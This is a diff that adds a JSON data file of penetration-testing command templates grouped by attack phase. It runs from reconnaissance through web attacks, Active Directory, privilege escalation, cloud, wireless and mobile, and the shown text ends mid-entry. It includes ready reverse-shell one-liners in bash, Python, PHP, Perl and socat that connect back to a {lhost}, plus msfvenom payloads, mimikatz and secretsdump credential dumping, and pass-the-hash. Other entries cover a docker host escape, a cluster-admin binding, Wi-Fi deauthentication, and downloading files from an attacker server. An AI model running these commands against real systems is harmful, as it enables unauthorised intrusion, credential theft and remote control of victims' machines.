@@ -1,0 +1,1388 @@
+[
+  {
+    "tool": "nmap",
+    "description": "Nmap Top 1000 TCP",
+    "phase": "Recon",
+    "command": "nmap -sC -sV -oA nmap_initial {target}"
+  },
+  {
+    "tool": "nmap",
+    "description": "Nmap All Ports TCP",
+    "phase": "Recon",
+    "command": "nmap -p- -T4 --min-rate 1000 -oA nmap_full {target}"
+  },
+  {
+    "tool": "nmap",
+    "description": "Nmap UDP Scan Top 100",
+    "phase": "Recon",
+    "command": "nmap -sU --top-ports 100 -oA nmap_udp {target}"
+  },
+  {
+    "tool": "nmap",
+    "description": "Nmap Ping Sweep",
+    "phase": "Recon",
+    "command": "nmap -sn {target_subnet}"
+  },
+  {
+    "tool": "nmap",
+    "description": "Nmap SMB Vuln Scan",
+    "phase": "Recon",
+    "command": "nmap -p 139,445 --script smb-vuln* {target}"
+  },
+  {
+    "tool": "rustscan",
+    "description": "Rustscan All Ports",
+    "phase": "Recon",
+    "command": "rustscan -a {target} -- -A -sC"
+  },
+  {
+    "tool": "masscan",
+    "description": "Masscan All Ports",
+    "phase": "Recon",
+    "command": "masscan -p1-65535,U:1-65535 {target_subnet} --rate={rate} -e {interface}"
+  },
+  {
+    "tool": "amass",
+    "description": "Amass Enum Passive",
+    "phase": "Recon",
+    "command": "amass enum -passive -d {domain} -o amass.txt"
+  },
+  {
+    "tool": "amass",
+    "description": "Amass Enum Active",
+    "phase": "Recon",
+    "command": "amass enum -active -d {domain} -brute -w {wordlist}"
+  },
+  {
+    "tool": "subfinder",
+    "description": "Subfinder",
+    "phase": "Recon",
+    "command": "subfinder -d {domain} -all -recursive"
+  },
+  {
+    "tool": "assetfinder",
+    "description": "Assetfinder",
+    "phase": "Recon",
+    "command": "assetfinder --subs-only {domain}"
+  },
+  {
+    "tool": "findomain",
+    "description": "Findomain",
+    "phase": "Recon",
+    "command": "findomain -t {domain} -q"
+  },
+  {
+    "tool": "dnsx",
+    "description": "DNSx Subdomain Resolution",
+    "phase": "Recon",
+    "command": "dnsx -l {subdomains_list} -resp-ips"
+  },
+  {
+    "tool": "dnsrecon",
+    "description": "DNSRecon Standard",
+    "phase": "Recon",
+    "command": "dnsrecon -d {domain} -t std"
+  },
+  {
+    "tool": "dnsrecon",
+    "description": "DNSRecon Zone Transfer",
+    "phase": "Recon",
+    "command": "dnsrecon -d {domain} -t axfr"
+  },
+  {
+    "tool": "fierce",
+    "description": "Fierce DNS Enum",
+    "phase": "Recon",
+    "command": "fierce --domain {domain}"
+  },
+  {
+    "tool": "gau",
+    "description": "Get All URLs (GAU)",
+    "phase": "Recon",
+    "command": "gau {domain} --subs > urls.txt"
+  },
+  {
+    "tool": "naabu",
+    "description": "Naabu Fast Port Scan",
+    "phase": "Recon",
+    "command": "naabu -host {target} -p - -silent"
+  },
+  {
+    "tool": "httpx",
+    "description": "HTTPx Probing",
+    "phase": "Recon",
+    "command": "httpx -l {domains_list} -sc -title -tech-detect -server -o httpx_alive.txt"
+  },
+  {
+    "tool": "httpx",
+    "description": "HTTPx Extract Paths",
+    "phase": "Recon",
+    "command": "httpx -l {urls_list} -path /{path} -mc 200"
+  },
+  {
+    "tool": "nuclei",
+    "description": "Nuclei Full Scan",
+    "phase": "Recon",
+    "command": "nuclei -u {target} -t {templates_path} -rl {rate_limit}"
+  },
+  {
+    "tool": "nuclei",
+    "description": "Nuclei Exposed Panels",
+    "phase": "Recon",
+    "command": "nuclei -u {target} -tags panel"
+  },
+  {
+    "tool": "nuclei",
+    "description": "Nuclei Misconfigs",
+    "phase": "Recon",
+    "command": "nuclei -l {urls_list} -tags config,misconfig,exposure"
+  },
+  {
+    "tool": "shodan",
+    "description": "Shodan Host Info",
+    "phase": "Recon",
+    "command": "shodan host {ip}"
+  },
+  {
+    "tool": "shodan",
+    "description": "Shodan Search",
+    "phase": "Recon",
+    "command": "shodan search \"{query}\""
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf Directory Fuzzing",
+    "phase": "Web",
+    "command": "ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403"
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf Recursive",
+    "phase": "Web",
+    "command": "ffuf -u {url}/FUZZ -w {wordlist} -recursion -recursion-depth {depth}"
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf Extension Fuzz",
+    "phase": "Web",
+    "command": "ffuf -u {url}/FUZZ -w {wordlist} -e .php,.txt,.bak,.zip,.html"
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf Subdomain Fuzz",
+    "phase": "Web",
+    "command": "ffuf -u http://{domain} -H \"Host: FUZZ.{domain}\" -w {wordlist} -mc 200"
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf Parameter Fuzz",
+    "phase": "Web",
+    "command": "ffuf -u {url}?FUZZ=test -w {wordlist}"
+  },
+  {
+    "tool": "ffuf",
+    "description": "Ffuf POST Data Fuzz",
+    "phase": "Web",
+    "command": "ffuf -X POST -u {url} -d \"FUZZ=test\" -w {wordlist}"
+  },
+  {
+    "tool": "feroxbuster",
+    "description": "Feroxbuster Dir Fuzzing",
+    "phase": "Web",
+    "command": "feroxbuster -u {url} -w {wordlist} -d {depth} -x php,txt"
+  },
+  {
+    "tool": "gobuster",
+    "description": "Gobuster Dir Fuzzing",
+    "phase": "Web",
+    "command": "gobuster dir -u {url} -w {wordlist}"
+  },
+  {
+    "tool": "dirsearch",
+    "description": "Dirsearch Basic",
+    "phase": "Web",
+    "command": "dirsearch -u {url} -e php,txt,zip,bak"
+  },
+  {
+    "tool": "arjun",
+    "description": "Arjun Param Discovery",
+    "phase": "Web",
+    "command": "arjun -u {url} -m GET"
+  },
+  {
+    "tool": "sqlmap",
+    "description": "SQLMap Basic",
+    "phase": "Web",
+    "command": "sqlmap -u \"{url}\" --batch"
+  },
+  {
+    "tool": "sqlmap",
+    "description": "SQLMap DBMS Extract",
+    "phase": "Web",
+    "command": "sqlmap -u \"{url}\" --dbs --random-agent"
+  },
+  {
+    "tool": "sqlmap",
+    "description": "SQLMap Dump Table",
+    "phase": "Web",
+    "command": "sqlmap -u \"{url}\" -D {db} -T {table} --dump"
+  },
+  {
+    "tool": "sqlmap",
+    "description": "SQLMap OS Shell",
+    "phase": "Web",
+    "command": "sqlmap -u \"{url}\" --os-shell"
+  },
+  {
+    "tool": "sqlmap",
+    "description": "SQLMap Request File",
+    "phase": "Web",
+    "command": "sqlmap -r {request_file} -p {parameter}"
+  },
+  {
+    "tool": "dalfox",
+    "description": "Dalfox XSS Scan",
+    "phase": "Web",
+    "command": "dalfox url \"{url}\""
+  },
+  {
+    "tool": "dalfox",
+    "description": "Dalfox Payload List",
+    "phase": "Web",
+    "command": "dalfox file {urls_list}"
+  },
+  {
+    "tool": "wpscan",
+    "description": "WPScan Enumerate Plugins",
+    "phase": "Web",
+    "command": "wpscan --url {url} --enumerate p,t,u"
+  },
+  {
+    "tool": "wpscan",
+    "description": "WPScan API Key",
+    "phase": "Web",
+    "command": "wpscan --url {url} --api-token {token}"
+  },
+  {
+    "tool": "joomscan",
+    "description": "Joomscan Info",
+    "phase": "Web",
+    "command": "joomscan -u {url}"
+  },
+  {
+    "tool": "droopescan",
+    "description": "Droopescan Drupal",
+    "phase": "Web",
+    "command": "droopescan scan drupal -u {url}"
+  },
+  {
+    "tool": "nikto",
+    "description": "Nikto Web Scan",
+    "phase": "Web",
+    "command": "nikto -h {target}"
+  },
+  {
+    "tool": "whatweb",
+    "description": "WhatWeb Tech Detect",
+    "phase": "Web",
+    "command": "whatweb -a 3 {target}"
+  },
+  {
+    "tool": "jwt_tool",
+    "description": "JWT Tool Decode",
+    "phase": "Web",
+    "command": "jwt_tool {token}"
+  },
+  {
+    "tool": "jwt_tool",
+    "description": "JWT Header Bypass",
+    "phase": "Web",
+    "command": "jwt_tool {token} -X i"
+  },
+  {
+    "tool": "tplmap",
+    "description": "Tplmap SSTI",
+    "phase": "Web",
+    "command": "tplmap.py -u \"{url}\""
+  },
+  {
+    "tool": "commix",
+    "description": "Commix Command Injection",
+    "phase": "Web",
+    "command": "commix --url=\"{url}\""
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec SMB Null Session",
+    "phase": "Network",
+    "command": "nxc smb {target} -u '' -p '' --shares"
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec SMB Enum",
+    "phase": "Network",
+    "command": "nxc smb {target} -u {user} -p {pass} --shares --users --groups"
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec WinRM",
+    "phase": "Network",
+    "command": "nxc winrm {target} -u {user} -p {pass} -x \"whoami\""
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec Pass The Hash",
+    "phase": "Network",
+    "command": "nxc smb {target} -u {user} -H {hash}"
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec ASREPRoast",
+    "phase": "Network",
+    "command": "nxc ldap {domain_controller} -u {userlist} -p '' --asreproast asrep.txt"
+  },
+  {
+    "tool": "netexec",
+    "description": "NetExec Kerberoast",
+    "phase": "Network",
+    "command": "nxc ldap {domain_controller} -u {user} -p {pass} --kerberoasting kerb.txt"
+  },
+  {
+    "tool": "crackmapexec",
+    "description": "CME SMB Exec",
+    "phase": "Network",
+    "command": "crackmapexec smb {target} -u {user} -p {pass} -x {command}"
+  },
+  {
+    "tool": "impacket-psexec",
+    "description": "Impacket PsExec",
+    "phase": "Network",
+    "command": "impacket-psexec {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "impacket-smbexec",
+    "description": "Impacket SMBExec",
+    "phase": "Network",
+    "command": "impacket-smbexec {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "impacket-wmiexec",
+    "description": "Impacket WMIExec",
+    "phase": "Network",
+    "command": "impacket-wmiexec {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "impacket-secrets",
+    "description": "Impacket SecretsDump",
+    "phase": "Network",
+    "command": "impacket-secretsdump {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "impacket-getnp",
+    "description": "Impacket GetNPUsers",
+    "phase": "Network",
+    "command": "impacket-GetNPUsers {domain}/ -usersfile {users} -format hashcat -outputfile asrep.txt"
+  },
+  {
+    "tool": "impacket-getuser",
+    "description": "Impacket GetUserSPNs",
+    "phase": "Network",
+    "command": "impacket-GetUserSPNs {domain}/{user}:{pass} -request -outputfile kerb.txt"
+  },
+  {
+    "tool": "impacket-samrdump",
+    "description": "Impacket Samrdump",
+    "phase": "Network",
+    "command": "impacket-samrdump {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "impacket-lookupsid",
+    "description": "Impacket LookupSID",
+    "phase": "Network",
+    "command": "impacket-lookupsid {domain}/{user}:{pass}@{target}"
+  },
+  {
+    "tool": "bloodhound-python",
+    "description": "Bloodhound Python Ingest",
+    "phase": "Network",
+    "command": "bloodhound-python -u {user} -p {pass} -ns {dc_ip} -d {domain} -c All"
+  },
+  {
+    "tool": "responder",
+    "description": "Responder Listen",
+    "phase": "Network",
+    "command": "sudo responder -I {interface} -dwP"
+  },
+  {
+    "tool": "evil-winrm",
+    "description": "Evil-WinRM Shell",
+    "phase": "Network",
+    "command": "evil-winrm -i {target} -u {user} -p {pass}"
+  },
+  {
+    "tool": "evil-winrm",
+    "description": "Evil-WinRM PTH",
+    "phase": "Network",
+    "command": "evil-winrm -i {target} -u {user} -H {hash}"
+  },
+  {
+    "tool": "xfreerdp",
+    "description": "xfreerdp Connect",
+    "phase": "Network",
+    "command": "xfreerdp /v:{target} /u:{user} /p:{pass} /cert:ignore"
+  },
+  {
+    "tool": "rpcclient",
+    "description": "RPCClient Null Session",
+    "phase": "Network",
+    "command": "rpcclient -U \"\" -N {target}"
+  },
+  {
+    "tool": "smbclient",
+    "description": "SMBClient List Shares",
+    "phase": "Network",
+    "command": "smbclient -L //{target} -U \"\" -N"
+  },
+  {
+    "tool": "smbclient",
+    "description": "SMBClient Connect",
+    "phase": "Network",
+    "command": "smbclient //{target}/{share} -U {user}"
+  },
+  {
+    "tool": "enum4linux",
+    "description": "Enum4Linux",
+    "phase": "Network",
+    "command": "enum4linux -a {target}"
+  },
+  {
+    "tool": "enum4linux-ng",
+    "description": "Enum4Linux-NG",
+    "phase": "Network",
+    "command": "enum4linux-ng -A {target}"
+  },
+  {
+    "tool": "nbtscan",
+    "description": "NBTScan Subnet",
+    "phase": "Network",
+    "command": "nbtscan -r {target_subnet}"
+  },
+  {
+    "tool": "hydra",
+    "description": "Hydra SSH Bruteforce",
+    "phase": "Network",
+    "command": "hydra -l {user} -P {wordlist} ssh://{target}"
+  },
+  {
+    "tool": "hydra",
+    "description": "Hydra FTP Bruteforce",
+    "phase": "Network",
+    "command": "hydra -l {user} -P {wordlist} ftp://{target}"
+  },
+  {
+    "tool": "hydra",
+    "description": "Hydra RDP Bruteforce",
+    "phase": "Network",
+    "command": "hydra -L {userlist} -P {wordlist} rdp://{target}"
+  },
+  {
+    "tool": "winpeas",
+    "description": "WinPEAS Bat",
+    "phase": "PrivEsc",
+    "command": "winpeas.bat"
+  },
+  {
+    "tool": "winpeas",
+    "description": "WinPEAS Exe",
+    "phase": "PrivEsc",
+    "command": "winpeas.exe"
+  },
+  {
+    "tool": "linux-exploit",
+    "description": "Linux Exploit Suggester",
+    "phase": "PrivEsc",
+    "command": "./les.sh"
+  },
+  {
+    "tool": "pspy",
+    "description": "PSPY Process Monitor",
+    "phase": "PrivEsc",
+    "command": "./pspy64 -pf -i 1000"
+  },
+  {
+    "tool": "sudo",
+    "description": "Sudo List",
+    "phase": "PrivEsc",
+    "command": "sudo -l"
+  },
+  {
+    "tool": "suid",
+    "description": "Find SUID Binaries",
+    "phase": "PrivEsc",
+    "command": "find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null"
+  },
+  {
+    "tool": "sgid",
+    "description": "Find SGID Binaries",
+    "phase": "PrivEsc",
+    "command": "find / -perm -2000 -type f -exec ls -la {} \\; 2>/dev/null"
+  },
+  {
+    "tool": "capabilities",
+    "description": "Get Capabilities",
+    "phase": "PrivEsc",
+    "command": "getcap -r / 2>/dev/null"
+  },
+  {
+    "tool": "crontab",
+    "description": "List Crontabs",
+    "phase": "PrivEsc",
+    "command": "cat /etc/crontab; ls -la /etc/cron.*"
+  },
+  {
+    "tool": "writable",
+    "description": "Find Writable Files",
+    "phase": "PrivEsc",
+    "command": "find / -type f -writable -exec ls -la {} \\; 2>/dev/null"
+  },
+  {
+    "tool": "writable_dirs",
+    "description": "Find Writable Dirs",
+    "phase": "PrivEsc",
+    "command": "find / -type d -writable -exec ls -la {} \\; 2>/dev/null"
+  },
+  {
+    "tool": "mimikatz",
+    "description": "Mimikatz LogonPasswords",
+    "phase": "PrivEsc",
+    "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+  },
+  {
+    "tool": "mimikatz",
+    "description": "Mimikatz LSA Dump",
+    "phase": "PrivEsc",
+    "command": "mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\""
+  },
+  {
+    "tool": "rubeus",
+    "description": "Rubeus TGT",
+    "phase": "PrivEsc",
+    "command": "Rubeus.exe asktgt /user:{user} /password:{pass} /domain:{domain} /dc:{dc_ip} /nowrap"
+  },
+  {
+    "tool": "rubeus",
+    "description": "Rubeus Dump",
+    "phase": "PrivEsc",
+    "command": "Rubeus.exe dump /nowrap"
+  },
+  {
+    "tool": "chntpw",
+    "description": "CHNTPW Reset SAM",
+    "phase": "PrivEsc",
+    "command": "chntpw -i /mnt/Windows/System32/config/SAM"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS STS Caller Identity",
+    "phase": "Cloud",
+    "command": "aws sts get-caller-identity"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS S3 List Buckets",
+    "phase": "Cloud",
+    "command": "aws s3 ls"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS S3 Sync Bucket",
+    "phase": "Cloud",
+    "command": "aws s3 sync s3://{bucket} ./local_dir"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS EC2 Describe",
+    "phase": "Cloud",
+    "command": "aws ec2 describe-instances --region {region}"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS IAM List Users",
+    "phase": "Cloud",
+    "command": "aws iam list-users"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS Get Target Param",
+    "phase": "Cloud",
+    "command": "aws ssm get-parameters --names {param_name} --with-decryption"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS Secrets Manager",
+    "phase": "Cloud",
+    "command": "aws secretsmanager list-secrets"
+  },
+  {
+    "tool": "aws",
+    "description": "AWS Lambda List",
+    "phase": "Cloud",
+    "command": "aws lambda list-functions --region {region}"
+  },
+  {
+    "tool": "pacu",
+    "description": "Pacu Run All AWS Modules",
+    "phase": "Cloud",
+    "command": "pacu --session {session_name} --run-all"
+  },
+  {
+    "tool": "gcp",
+    "description": "GCP Auth List",
+    "phase": "Cloud",
+    "command": "gcloud auth list"
+  },
+  {
+    "tool": "gcp",
+    "description": "GCP Projects Config",
+    "phase": "Cloud",
+    "command": "gcloud config get-value project"
+  },
+  {
+    "tool": "gcp",
+    "description": "GCP List Instances",
+    "phase": "Cloud",
+    "command": "gcloud compute instances list"
+  },
+  {
+    "tool": "azure",
+    "description": "Az Login",
+    "phase": "Cloud",
+    "command": "az login"
+  },
+  {
+    "tool": "azure",
+    "description": "Az Account Show",
+    "phase": "Cloud",
+    "command": "az account show"
+  },
+  {
+    "tool": "azure",
+    "description": "Az VM List",
+    "phase": "Cloud",
+    "command": "az vm list --output table"
+  },
+  {
+    "tool": "docker",
+    "description": "Docker List Images",
+    "phase": "Cloud",
+    "command": "docker images"
+  },
+  {
+    "tool": "docker",
+    "description": "Docker List Containers",
+    "phase": "Cloud",
+    "command": "docker ps -a"
+  },
+  {
+    "tool": "docker",
+    "description": "Docker Run Privileged",
+    "phase": "Cloud",
+    "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Cluster Info",
+    "phase": "Cloud",
+    "command": "kubectl cluster-info"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Get Pods",
+    "phase": "Cloud",
+    "command": "kubectl get pods -A"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Describe Pod",
+    "phase": "Cloud",
+    "command": "kubectl describe pod {pod_name}"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Get Secrets",
+    "phase": "Cloud",
+    "command": "kubectl get secrets -n {namespace}"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Exec Shell",
+    "phase": "Cloud",
+    "command": "kubectl exec -it {pod_name} -- /bin/bash"
+  },
+  {
+    "tool": "kubectl",
+    "description": "Kubectl Create RoleBind",
+    "phase": "Cloud",
+    "command": "kubectl create clusterrolebinding root-admin --clusterrole=cluster-admin --serviceaccount=default:default"
+  },
+  {
+    "tool": "nc",
+    "description": "Netcat Reverse Shell Listener",
+    "phase": "Shells",
+    "command": "nc -lvnp {port}"
+  },
+  {
+    "tool": "nc",
+    "description": "Netcat Bind Shell Config",
+    "phase": "Shells",
+    "command": "nc -lvnp {port} -e /bin/bash"
+  },
+  {
+    "tool": "bash",
+    "description": "Bash Reverse Shell",
+    "phase": "Shells",
+    "command": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+  },
+  {
+    "tool": "python",
+    "description": "Python Reverse Shell",
+    "phase": "Shells",
+    "command": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+  },
+  {
+    "tool": "php",
+    "description": "PHP Reverse Shell",
+    "phase": "Shells",
+    "command": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  },
+  {
+    "tool": "perl",
+    "description": "Perl Reverse Shell",
+    "phase": "Shells",
+    "command": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  },
+  {
+    "tool": "socat",
+    "description": "Socat Reverse Shell Listener",
+    "phase": "Shells",
+    "command": "socat file:`tty`,raw,echo=0 tcp-listen:{port}"
+  },
+  {
+    "tool": "socat",
+    "description": "Socat Reverse Shell Send",
+    "phase": "Shells",
+    "command": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
+  },
+  {
+    "tool": "socat",
+    "description": "Socat Port Forward Local",
+    "phase": "Shells",
+    "command": "socat tcp-listen:{lport},reuseaddr,fork tcp:{rhost}:{rport}"
+  },
+  {
+    "tool": "chisel",
+    "description": "Chisel Server",
+    "phase": "Shells",
+    "command": "chisel server -p {port} --reverse"
+  },
+  {
+    "tool": "chisel",
+    "description": "Chisel Client R-Fwd",
+    "phase": "Shells",
+    "command": "chisel client {server_ip}:{server_port} R:{lport}:{rhost}:{rport}"
+  },
+  {
+    "tool": "chisel",
+    "description": "Chisel Client Socks5",
+    "phase": "Shells",
+    "command": "chisel client {server_ip}:{server_port} R:socks"
+  },
+  {
+    "tool": "ligolo-ng",
+    "description": "Ligolo Proxy Interface",
+    "phase": "Shells",
+    "command": "sudo ip tuntap add user {user} mode tun ligolo && sudo ip link set ligolo up && sudo ip route add {target_subnet} dev ligolo"
+  },
+  {
+    "tool": "ligolo-ng",
+    "description": "Ligolo Proxy Server",
+    "phase": "Shells",
+    "command": "ligolo-proxy -selfcert"
+  },
+  {
+    "tool": "ligolo-ng",
+    "description": "Ligolo Agent Run",
+    "phase": "Shells",
+    "command": "ligolo-agent -connect {server_ip}:11601 -ignore-cert"
+  },
+  {
+    "tool": "ssh",
+    "description": "SSH Dynamic Port Fwd",
+    "phase": "Shells",
+    "command": "ssh -D {local_port} -q -C -N {user}@{target}"
+  },
+  {
+    "tool": "ssh",
+    "description": "SSH Local Port Fwd",
+    "phase": "Shells",
+    "command": "ssh -L {lport}:{rhost}:{rport} {user}@{target}"
+  },
+  {
+    "tool": "ssh",
+    "description": "SSH Remote Port Fwd",
+    "phase": "Shells",
+    "command": "ssh -R {rport}:{lhost}:{lport} {user}@{target}"
+  },
+  {
+    "tool": "sshuttle",
+    "description": "Sshuttle Subnet",
+    "phase": "Shells",
+    "command": "sshuttle -r {user}@{target} {target_subnet}"
+  },
+  {
+    "tool": "proxychains",
+    "description": "Proxychains Nmap",
+    "phase": "Shells",
+    "command": "proxychains4 nmap -sT -Pn {target}"
+  },
+  {
+    "tool": "upx",
+    "description": "UPX Packer",
+    "phase": "Shells",
+    "command": "upx -9 {binary_file}"
+  },
+  {
+    "tool": "hashcat",
+    "description": "Hashcat MD5",
+    "phase": "Crypto",
+    "command": "hashcat -m 0 -a 0 {hash_file} {wordlist}"
+  },
+  {
+    "tool": "hashcat",
+    "description": "Hashcat NTLM",
+    "phase": "Crypto",
+    "command": "hashcat -m 1000 -a 0 {hash_file} {wordlist}"
+  },
+  {
+    "tool": "hashcat",
+    "description": "Hashcat NetNTLMv2",
+    "phase": "Crypto",
+    "command": "hashcat -m 5600 -a 0 {hash_file} {wordlist}"
+  },
+  {
+    "tool": "hashcat",
+    "description": "Hashcat SHA256",
+    "phase": "Crypto",
+    "command": "hashcat -m 1400 -a 0 {hash_file} {wordlist}"
+  },
+  {
+    "tool": "hashcat",
+    "description": "Hashcat bcrypt",
+    "phase": "Crypto",
+    "command": "hashcat -m 3200 -a 0 {hash_file} {wordlist}"
+  },
+  {
+    "tool": "john",
+    "description": "John The Ripper Basic",
+    "phase": "Crypto",
+    "command": "john --wordlist={wordlist} {hash_file}"
+  },
+  {
+    "tool": "john",
+    "description": "John NTLM",
+    "phase": "Crypto",
+    "command": "john --format=nt --wordlist={wordlist} {hash_file}"
+  },
+  {
+    "tool": "john",
+    "description": "John SSH Key",
+    "phase": "Crypto",
+    "command": "ssh2john {ssh_key_file} > hash.txt && john --wordlist={wordlist} hash.txt"
+  },
+  {
+    "tool": "unshadow",
+    "description": "Unshadow Passwords",
+    "phase": "Crypto",
+    "command": "unshadow /etc/passwd /etc/shadow > cracked.txt"
+  },
+  {
+    "tool": "msfvenom",
+    "description": "MSFVenom Win Rev Shell",
+    "phase": "Crypto",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
+  },
+  {
+    "tool": "msfvenom",
+    "description": "MSFVenom Linux Rev Shell",
+    "phase": "Crypto",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
+  },
+  {
+    "tool": "msfvenom",
+    "description": "MSFVenom PHP Base64",
+    "phase": "Crypto",
+    "command": "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php"
+  },
+  {
+    "tool": "airmon-ng",
+    "description": "Airmon Start",
+    "phase": "Wireless",
+    "command": "sudo airmon-ng start {interface}"
+  },
+  {
+    "tool": "airodump-ng",
+    "description": "Airodump Scan",
+    "phase": "Wireless",
+    "command": "sudo airodump-ng {interface}mon"
+  },
+  {
+    "tool": "airodump-ng",
+    "description": "Airodump Capture",
+    "phase": "Wireless",
+    "command": "sudo airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {interface}mon"
+  },
+  {
+    "tool": "aireplay-ng",
+    "description": "Aireplay Deauth",
+    "phase": "Wireless",
+    "command": "sudo aireplay-ng -0 {count} -a {bssid} -c {client_mac} {interface}mon"
+  },
+  {
+    "tool": "aircrack-ng",
+    "description": "Aircrack WPA/WPA2 Crack",
+    "phase": "Wireless",
+    "command": "aircrack-ng -w {wordlist} -b {bssid} {capture_file}.cap"
+  },
+  {
+    "tool": "wash",
+    "description": "Wash WPS Scan",
+    "phase": "Wireless",
+    "command": "wash -i {interface}mon"
+  },
+  {
+    "tool": "reaver",
+    "description": "Reaver WPS Pixie",
+    "phase": "Wireless",
+    "command": "reaver -i {interface}mon -b {bssid} -K 1"
+  },
+  {
+    "tool": "python",
+    "description": "Python HTTP Server",
+    "phase": "Utility",
+    "command": "python3 -m http.server {port}"
+  },
+  {
+    "tool": "php",
+    "description": "PHP Dev Server",
+    "phase": "Utility",
+    "command": "php -S 0.0.0.0:{port}"
+  },
+  {
+    "tool": "smbserver",
+    "description": "Impacket SMB Server",
+    "phase": "Utility",
+    "command": "impacket-smbserver -smb2support {share_name} {local_dir}"
+  },
+  {
+    "tool": "wget",
+    "description": "Wget Download",
+    "phase": "Utility",
+    "command": "wget http://{lhost}:{port}/{file} -O {output_file}"
+  },
+  {
+    "tool": "curl",
+    "description": "Curl Download",
+    "phase": "Utility",
+    "command": "curl http://{lhost}:{port}/{file} -o {output_file}"
+  },
+  {
+    "tool": "certutil",
+    "description": "Certutil Download",
+    "phase": "Utility",
+    "command": "certutil.exe -urlcache -f http://{lhost}:{port}/{file} {output_file}"
+  },
+  {
+    "tool": "powershell",
+    "description": "PowerShell Download",
+    "phase": "Utility",
+    "command": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{lhost}:{port}/{file}', '{output_file}')\""
+  },
+  {
+    "tool": "tar",
+    "description": "Tar Compress",
+    "phase": "Utility",
+    "command": "tar -czvf {archive_name}.tar.gz {folder_or_file}"
+  },
+  {
+    "tool": "tar",
+    "description": "Tar Extract",
+    "phase": "Utility",
+    "command": "tar -xzvf {archive_name}.tar.gz"
+  },
+  {
+    "tool": "zip",
+    "description": "Zip Compress",
+    "phase": "Utility",
+    "command": "zip -r {archive_name}.zip {folder_or_file}"
+  },
+  {
+    "tool": "unzip",
+    "description": "Zip Extract",
+    "phase": "Utility",
+    "command": "unzip {archive_name}.zip"
+  },
+  {
+    "tool": "strings",
+    "description": "Strings Extract",
+    "phase": "Utility",
+    "command": "strings {binary_file}"
+  },
+  {
+    "tool": "grep",
+    "description": "Grep Recursive",
+    "phase": "Utility",
+    "command": "grep -rnw '{path}' -e '{pattern}'"
+  },
+  {
+    "tool": "find",
+    "description": "Find Files by Name",
+    "phase": "Utility",
+    "command": "find {path} -name \"*{pattern}*\""
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Devices",
+    "phase": "Mobile",
+    "command": "adb devices"
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Connect",
+    "phase": "Mobile",
+    "command": "adb connect {target_ip}:{port}"
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Shell",
+    "phase": "Mobile",
+    "command": "adb shell"
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Install APK",
+    "phase": "Mobile",
+    "command": "adb install {apk_file}"
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Push File",
+    "phase": "Mobile",
+    "command": "adb push {local_file} {remote_path}"
+  },
+  {
+    "tool": "adb",
+    "description": "ADB Pull File",
+    "phase": "Mobile",
+    "command": "adb pull {remote_path} {local_file}"
+  },
+  {
+    "tool": "apktool",
+    "description": "Apktool Decompile",
+    "phase": "Mobile",
+    "command": "apktool d {apk_file} -o {output_dir}"
+  },
+  {
+    "tool": "apktool",
+    "description": "Apktool Build",
+    "phase": "Mobile",
+    "command": "apktool b {input_dir} -o {output_apk}"
+  },
+  {
+    "tool": "jarsigner",
+    "description": "Jarsigner Sign APK",
+    "phase": "Mobile",
+    "command": "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore_file} {apk_file} {alias_name}"
+  },
+  {
+    "tool": "zipalign",
+    "description": "Zipalign APK",
+    "phase": "Mobile",
